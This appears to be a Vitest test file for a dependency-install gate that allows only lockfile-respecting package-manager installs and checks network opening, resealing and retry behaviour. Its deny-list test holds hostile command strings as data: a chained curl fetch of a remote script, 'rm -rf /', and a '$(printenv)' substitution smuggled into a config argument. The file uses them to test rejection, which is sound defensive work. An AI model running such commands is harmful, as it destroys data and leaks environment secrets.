import { describe, expect, it } from "vitest";
import {
  evaluateDependencyInstallCommand,
  runDependencyInstallThroughGate,
} from "./dependency-install-gate";

describe("dependency install gate", () => {
  it("allows package-manager install commands and rejects shell syntax or dangerous commands", () => {
    for (const command of [
      "bun install --frozen-lockfile",
      "bun install --frozen-lockfile --filter=@midday/website",
      "npm ci --no-audit",
      "npm ci --no-audit --workspace=@acme/web",
      "npm install --package-lock-only --ignore-scripts --no-audit --no-fund",
      "pnpm install --frozen-lockfile",
      "yarn install --immutable",
      "corepack pnpm install --frozen-lockfile",
    ]) {
      expect(evaluateDependencyInstallCommand(command)).toEqual({
        status: "allowed",
      });
    }

    for (const command of [
      "npm install && curl https://example.com/script.sh",
      "rm -rf /",
      "npm run build",
      "bun add left-pad",
      "pnpm install --config=$(printenv)",
    ]) {
      expect(evaluateDependencyInstallCommand(command)).toMatchObject({
        status: "denied",
      });
    }
  });

  it("reseals dependency network when the install command fails", async () => {
    const events: string[] = [];

    const result = await runDependencyInstallThroughGate({
      command: "npm ci --no-audit",
      closeNetwork: async () => {
        events.push("closed");
      },
      openNetwork: async () => {
        events.push("opened");
      },
      runCommand: async () => {
        events.push("ran");
        return { exitCode: 1, stderr: "install failed", stdout: "" };
      },
    });

    expect(result).toEqual({
      exitCode: 1,
      stderr: "install failed",
      status: "failed",
      stdout: "",
    });
    expect(events).toEqual(["opened", "ran", "closed"]);
  });

  it("retries once inside the open window when the install fails with a network signature", async () => {
    let runs = 0;

    const result = await runDependencyInstallThroughGate({
      command: "bun install --frozen-lockfile",
      closeNetwork: async () => {},
      openNetwork: async () => {},
      runCommand: async () => {
        runs += 1;
        return runs === 1
          ? {
              exitCode: 1,
              stderr:
                "error: ConnectionClosed downloading tarball xlsx@https://cdn.sheetjs.com/xlsx-0.20.2/xlsx-0.20.2.tgz",
              stdout: "",
            }
          : { exitCode: 0, stderr: "", stdout: "installed" };
      },
    });

    expect(result).toMatchObject({ status: "succeeded" });
    expect(runs).toBe(2);
  });

  it("does not retry a deterministic install failure", async () => {
    let runs = 0;

    await runDependencyInstallThroughGate({
      command: "bun install --frozen-lockfile",
      closeNetwork: async () => {},
      openNetwork: async () => {},
      runCommand: async () => {
        runs += 1;
        return {
          exitCode: 1,
          stderr: "error: lockfile had changes, but lockfile is frozen",
          stdout: "",
        };
      },
    });

    expect(runs).toBe(1);
  });
});
